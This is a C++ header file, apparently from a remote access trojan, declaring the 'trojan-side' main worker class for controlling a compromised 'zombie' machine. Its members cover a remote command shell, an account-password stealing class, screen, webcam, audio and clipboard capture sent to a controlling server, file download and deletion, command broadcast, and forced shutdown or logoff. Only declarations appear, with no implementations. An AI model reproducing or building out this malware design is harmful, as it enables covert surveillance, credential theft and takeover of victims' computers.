#pragma once

#include "ModuleSocket.h"
#include "SystemInfo.h"
#include "Disk.h"
#include "FileInfo.h"
#include "CmdShell.h"
#include "ChatMsgDlg.h"
#include "TaskManager.h"
#include "ReadPsw.h"
#include "Screen.h"
#include "ViewVideo.h"
#include "AudioManager.h"

//马端主工作线程类
class CWorkThreadMain
{
public:
	CWorkThreadMain(void);
	~CWorkThreadMain(void);
    
	 void GetSysInfo();  //得到肉鸡机器的基本配置信息
     SOCKET Run();       //运行
	 void ShakeHandCheck(IN const SOCKET Sock, OUT bool* pbSuccess);
	 void ExecCommand(IN const SOCKET l_Socket);  //执行命令
	 bool m_bRunFlag;   //状态标记
	 int m_nTime;
private:
	CModuleSocket m_moduleSocket;
	CSystemInfo   m_sysInfo;        //操作系统基本信息类
	CDisk m_diskInfo;               //磁盘文件类
	CFileInfo m_fileInfo;           //文件类
	CCmdShell m_cmdShell;           //CMD类
    CChatMsgDlg m_ChatMsgDlg;       //聊天信息对话框
	CTaskManager m_TaskManager;     //任务管理器
	CReadPsw    m_readPsw;          //获取帐号密码管理类
	CScreen     m_Screen;           //屏幕传输类
	HANDLE      m_hThread;
	CAudioManager m_AudioManager;   //语音类

	SOCKET m_socket;                //和服务器通信socket
	char m_szIpAddr[IPADDR_SIZE];   //ip地址
	static DWORD WINAPI ToDownFileProc(LPVOID lpParamter);
	static DWORD WINAPI DeleteTargetFileProc( LPVOID lpParamter);  //删除文件或文件夹 
	static DWORD WINAPI SenCmdProc(LPVOID lpParameter);  //发送数据
	static DWORD WINAPI InitCmdProc(LPVOID lpParameter);  //初始化管道

	static DWORD WINAPI InitChatMsgDlgProc(LPVOID lpParameter);  //初始化聊天对话框
	static DWORD WINAPI SendScreeProc(LPVOID lpParameter);  //发送屏幕信息
	static DWORD WINAPI SendVideoProc(LPVOID lpParameter);  //发送视屏信息
	static DWORD WINAPI DealBroadCastProc(LPVOID lpParameter);  //远程命令广播
	static DWORD WINAPI SendClipBoardProc(LPVOID lpParameter);  //发送剪贴板数据
private:
	void ExecShutdown();   //关机
	void ExecLogoff(); /*注销 */
	void ExecRestart();  //重启
	void ExecOperarotr(IN const UINT nCommond);
	CString DownloadFile(IN const CString strWebPath, OUT CString& strExePath, OUT bool* pbSuccess);   //文件下载
    UINT32 GetProgramPath( OUT CString& strPath, OUT bool* bSuccess);  //获取Program路径
	void DealDesktopInfo(IN const DESKTOPINFO_S tagDesktopInfo);  //处理桌面管理任务
};
